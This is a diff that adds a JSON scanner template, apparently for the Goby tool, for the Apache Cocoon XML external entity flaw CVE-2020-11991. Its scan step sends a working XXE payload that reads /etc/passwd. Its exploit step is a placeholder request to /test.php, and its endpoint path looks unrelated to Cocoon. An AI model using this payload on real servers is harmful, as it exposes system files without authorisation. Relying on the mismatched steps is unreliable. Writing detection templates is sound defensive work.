@@ -1,0 +1,98 @@
+{
+      "Name": "Apache Cocoon XML Injection CVE-2020-11991",
+      "Level": "2",
+      "Tags": [
+            "XML Injection"
+      ],
+      "GobyQuery": "app=\"Apache-Cocoon\"",
+      "Description": "Apache Cocoon is a Spring-based framework (since version 2.2 of Cocoon) built around the concepts of separation of concerns and component-based development. ",
+      "Product": "Apache Cocoon",
+      "Homepage": "https://cocoon.apache.org/",
+      "Author": "",
+      "Impact": "When using the StreamGenerator, the code parse a user-provided XML. A specially crafted XML, including external system entities, could be used to access any file on the server system. Apache Cocoon &lt;= 2.1.12",
+      "Recommendation": "https://cocoon.apache.org/",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2020-11991"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/v2/api/product/manger/getInfo",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-type": "text/xml"
+                        },
+                        "data_type": "text",
+                        "data": "<!--?xml version=\"1.0\" ?-->\r\n<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\r\n<userInfo>\r\n<firstName>John</firstName> \r\n<lastName>&ent;</lastName>\r\n</userInfo>"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/test.php",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
